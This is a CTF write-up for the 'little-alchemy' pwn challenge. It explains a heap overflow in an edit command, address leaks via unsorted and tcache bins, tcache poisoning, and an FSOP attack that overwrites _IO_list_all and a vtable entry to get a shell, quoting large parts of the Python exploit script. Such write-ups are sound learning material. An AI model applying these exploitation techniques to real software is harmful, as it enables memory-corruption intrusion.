# little-alchemy

## TLDR
* Heap overflow
* Tcache poisoning
* FSOP

## Challenge
### Description
result of file command
* Arch    : x86-64
* Library : Dynamically linked
* Symbol  : Not Stripped

result of checksec
* RELRO  : Partial RELRO
* Canary : Disable
* NX     : Enable
* PIE    : Enable 

libc version: 2.31(not distributed)

The challenge binary is written by C++.  
I'm not good at reversing binaries of this lang.  
So I found the vulnerability mainly by dynamic analysis.  

Even though we don't have to get a shell to solve this chal, I finally got a shall.  
I noticed that after solving the challenge :(  
We should read the discription of challenges before solving.  

:description
```
Note: the flag is inside the binary, and clearly it is different on the remote server.
```

Through dynamic analysis, I found that we can allocate chunks whose size is 0x30 or 0x50.  
The former is made by command 1 with index (-1, -1), another is index(-1, -2).  

### Exploit 
"2. Edit" command has a vulnerability of overflow.  
So we can overwrite memory on heap freely.  

My exploit code is [solve.py](https://github.com/kam1tsur3/2021_CTF/blob/master/m0lecon/pwn/little_alchemy/solve.py).  
I'll use this to show how to exploit.

Let's begin.  

* leak addresses 
We want some kind of chunks to get addresses of memory.   

1. chunks not freed for leaking address of binary
In this binary, an address of .data section is stored at the top of allocated chunks([chunk+0x0]). And editable string is stored which begin at [chunk+0x18].  
So, we make two chunks in contiguous location, and trigger overflow with edit command against the former chunk. We can get the address of .data secion with show command.  
One thing to keep in mind, edit command can trigger overflow, but it ends with null byte.  
In order to leak, we have to prepare some bytes at other location, and then copy them to target location.  
With copy command, we can edit memory without null byte.

In my exploit, this part is relevant.
```
...
	# leak binary addres
	payload = b"0"*0x17+b"X"
	edit(4,payload)
	copy(4,0)
	show_one(0) 					# leak 
	conn.recvuntil("0X")
	bin_base = conn.recvline()[:-1] 
	bin_base = u64(bin_base+b'\x00'*(8-len(bin_base))) - 0x5d78
	got_strlen = bin_base + off_got_strlen
	
	# leak heap addres part
	copy(4,6)
	show_one(6)						# leak
	conn.recvuntil("0X") 			
	heap_base = conn.recvline()[:-1] 
	first_chunk = u64(heap_base+b'\x00'*(8-len(heap_base))) - 0x6d110 + 0x6cea0
...
```
2. chunks linked to tacahe for leaking address of heap
Same as the previous example, we can get the address of heap.  
We only have to link the letter chunk of two chunks in contiguous location.  

3. chunks linked to unsorted bin for leaking address of libc
To get this one, we allocate enough size of memory avoiding freed chunks are reused.  

In my exploit, this part is relevant.
```
...
	get_x30_chk(0)
	get_x30_chk(1)
	
	payload = b"A"*0x10
	payload += p64(0x131) # 0x31 -> 0x131
	for i in range(2, 9):
		get_x50_chk(i)
		edit(i-1, payload[:-1]) # overwrite size not to be reused
		get_x30_chk(i)
	get_x50_chk(2)
	get_x50_chk(3)
	get_x50_chk(4)
	get_x50_chk(5)
...
...
...
	# link fake chunk to unsorted bin
	payload = b"A"*0x10
	payload += p64(0x451) 			# overwrite chunk size 0x31->0x451
	edit(0,payload[:-1])
	
	# leak libc address
	get_x50_chk(8)

	edit(4, "A"*0x17+"X")
	delete(1)						# linked to unsorted bin
	copy(4,0)
	show_one(0)						# leak address of unsorted bin in libc
	conn.recvuntil("AX")
...
```
Then overwrite chunk size into 0x451 which linked to unsorted bin, not to tcache.  
Same as 1 & 2, we can get the address of libc with show command.

We are not distributed libc file, so I guess the version of libc from unsorted bin address. 
But actually I think it is bad approach.

* tcache poisoning 
We have the address of binary, heap and libc.  
So Let's start exploit.  
In this time, we can't use _free_hook and  one_gadget RCE to get a shell, So I used FSOP exploit.  
Now we can write heap area freely, it is easy for us to use tcache poisoning.  
I want to overwrite _IO_list_all and a vtable entry.  
So link the addresses which are close to them to tcache.

In my exploit, this part is
```
...
	# tcache poisoning
	payload = b"D"*0x60
	payload += p64(0x31)
	payload += p64(libc_vtable-0x10) # link [_IO_file_jumps-0x10] to tcache(0x30)
	
	edit(7, payload)
	
	get_x30_chk(2)
	get_x30_chk(3)
	
	payload = p64(libc_system)
	edit(3, payload)				# write libc_system at [_IO_file_jumps+8]
	
	payload = b"B"*0x68
	payload += p64(libc_io_list-0x18) 	# link [_IO_list_all-0x18] to tcache(0x50)
	edit(2, payload)				
	
	get_x50_chk(6)
	get_x50_chk(7)
...
```

* FSOP
If you don't know FSOP well, I think [this site](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique) is helpful(and [another](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)).  
Not to make program failed, we have to satisfy some condition.
* vtable check
fp->vtable must be in _IO_vtables section.  
So we set fake_fp->vtable = (_IO_file_jumps-0x10), and [_IO_file_jumps+0x8] = libc_system(because the offset of io_overflow in vtable is 0x18).
* call _IO_OVERFLOW
1. fp->_mode <= 0
2. fp->_IO_write_ptr > fp->_IO_write_base

Then, call exit() with exit command, get a shell.
```
$ls
PoW.py    entrypoint.sh  littleAlchemy
```
But, where is flag???  
oh, it is in binary.  Type 'strings ./littleAlchemy'.

## Reference
FSOP
* https://ctf-wiki.org/pwn/linux/io_file/fsop/
* https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

twitter: @kam1tsur3
